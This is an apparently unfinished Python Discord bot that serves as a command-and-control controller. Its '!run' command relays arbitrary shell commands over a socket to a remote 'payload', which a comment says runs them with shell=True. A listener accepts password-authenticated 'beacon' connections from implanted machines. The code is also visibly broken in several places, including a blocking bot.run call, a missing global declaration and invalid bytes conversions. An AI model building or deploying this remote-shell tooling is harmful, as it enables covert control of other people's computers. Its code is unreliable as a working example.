###

###
import shlex
import socket
from subprocess import Popen, PIPE

import discord
from discord.ext import commands

bot = commands.Bot(command_prefix='!')
remoteAddr = ''

@bot.command()
async def run(ctx, *args):
    ##################################################input
    cmd = ''
    for bit in args:
        cmd += bit + ' '
    print('USR CMD: ' + cmd)

    ##################################################user input editing

    ##################################################directory services

    ##################################################send to remote
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:  #send greeting to command server
        s.connect((remoteAddr, 4455))
        command = shlex.split(cmd)
        print('Sending command to payload @' + remoteAddr)
        s.sendall(bytes(command))

        ##this is what the remote payload does
        ##process = Popen(command, shell=True, stdout=PIPE, stderr=PIPE)
        ##stdout, stderr = process.communicate()

        data = s.recv(1024)
        stdout = data.decode("utf-8")

    ##################################################discord output
    print('----returns----')
    print(stdout)
    await ctx.send('```' + str(stdout) + '```')


######################################################Command init
def main(*args):

    with open('secrets.txt') as f:
        secret = f.read()
        bot.run(secret)

    if len(args) > 1:
        password = args[1]
    else:
        password = input('Password for beacon: ')

    #for now this just accepts one beacon and then goes to command, this should be a thread so it can accept multiple
    #beacons.
    beacon = 'CONNECT: ' + password
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 4454))
        s.listen()
        conn, addr = s.accept()
        with conn:
            print('Connected by', addr)
            data = conn.recv(1024)
            if repr(data) == bytes(beacon):
                remoteAddr = addr
                conn.sendall(b'ACCEPTED')
                print('Authenticated ', addr)
            else:
                conn.sendall(b'BAD CRED')
                print('Rejected ', addr, '| 10:BAD CRED')



